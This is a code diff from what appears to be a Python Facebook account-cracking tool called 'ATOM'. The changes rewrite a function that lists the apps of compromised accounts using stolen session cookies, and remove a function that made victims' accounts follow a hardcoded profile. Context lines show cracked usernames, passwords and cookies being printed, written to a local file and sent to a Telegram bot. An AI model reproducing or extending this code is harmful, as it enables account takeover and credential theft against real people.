@@ -981,59 +981,37 @@ def xp():
   print('');print(f'{N} Hi Dear User Crack process has been completed')
   input(f'{dot}Press Enter To Go Menu');os.system('python ATOM.py')
 
-def cek_apk(session, coki):
-    try:
-        # Check active apps
-        active_apps_response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki})
-        active_apps_soup = BeautifulSoup(active_apps_response.content, "html.parser")
-        active_apps = active_apps_soup.find_all("div", class_="k")
+def cek_apk(requests_session, cookie):
+    # Check active apps
+    active_apps_response = requests_session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",
+                                                cookies={"cookie": cookie}).text
+    active_soup = BeautifulSoup(active_apps_response, "html.parser")
+    active_form = active_soup.find("form", method="post")
+    active_games = [i.text for i in active_form.find_all("h3")]
 
-        if not active_apps:
-            print("\n[!] Sorry, there are no active apps.")
-        else:
-            print("\n[🎮] ☆ Your Active Apps ☆:")
-            for idx, app in enumerate(active_apps, 1):
-                app_name = app.find("h3").text.strip()
-                print(f"[{idx}] {app_name}")
-
-        # Check inactive apps
-        inactive_apps_response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki})
-        inactive_apps_soup = BeautifulSoup(inactive_apps_response.content, "html.parser")
-        inactive_apps = inactive_apps_soup.find_all("div", class_="k")
-
-        if not inactive_apps:
-            print("\n[!] Sorry, there are no expired apps.")
-        else:
-            print("\n[🎮] ◇ Your Expired Apps ◇:")
-            for idx, app in enumerate(inactive_apps, 1):
-                app_name = app.find("h3").text.strip()
-                print(f"[{idx}] {app_name}")
-
-    except requests.exceptions.RequestException as e:
-        print(f"Error checking apps: {e}")
- 
-def follow(self, session, coki):
-    # Make a GET request to the profile page
-    profile_url = 'https://www.facebook.com/profile.php?id=100084492703624&mibextid=ZbWKwL'
-    response = session.get(profile_url, cookies={'cookie': coki})
-    
-    # Parse the HTML using BeautifulSoup
-    soup = BeautifulSoup(response.text, 'html.parser')
-    
-    # Find the link to follow
-    follow_link = soup.find('a', string='Ikuti')
-    
-    if follow_link:
-        follow_url = 'https://free.facebook.com' + follow_link.get('href')
-        
-        # Make a GET request to the follow URL
-        follow_response = session.get(follow_url, cookies={'cookie': coki})
-        
-        # Return the response text (if needed)
-        return follow_response.text
+    if len(active_games) == 0:
+        print('\r[!] Sorry, there are no Active Apps\n')
     else:
-        return "Follow link not found"
+        print('[🎮] ☆ Your Active Apps ☆:')
+        for idx, game in enumerate(active_games, start=1):
+            print(f"[{idx}] {game.replace('Ditambahkan pada', ' Ditambahkan pada')}")
 
+    # Check inactive (expired) apps
+    inactive_apps_response = requests_session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",
+                                                  cookies={"cookie": cookie}).text
+    inactive_soup = BeautifulSoup(inactive_apps_response, "html.parser")
+    inactive_form = inactive_soup.find("form", method="post")
+    inactive_games = [i.text for i in inactive_form.find_all("h3")]
+
+    if len(inactive_games) == 0:
+        print('\r[!] Sorry, there are no Expired Apps\n')
+    else:
+        print('[🎮] ◇ Your Expired Apps ◇:')
+        for idx, game in enumerate(inactive_games, start=1):
+            print(f"[{idx}] {game.replace('Kedaluwarsa', ' Kedaluwarsa')}")
+
+    print('') 
+ 
 def m1(idf,pwv):
  global loop
  global ok
@@ -1242,14 +1220,12 @@ def m4(idf,pwv):
     if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
-            print(cek_apk(session, coki))
+            cek_apk(session, coki) 
             open('/sdcard/ATOM-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1 
             break
-   if "c_user" in ses.cookies.get_dict().keys():
-            cek_apk(ses, coki)
    elif 'checkpoint' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     coki1 = coki.split("1000")[1]
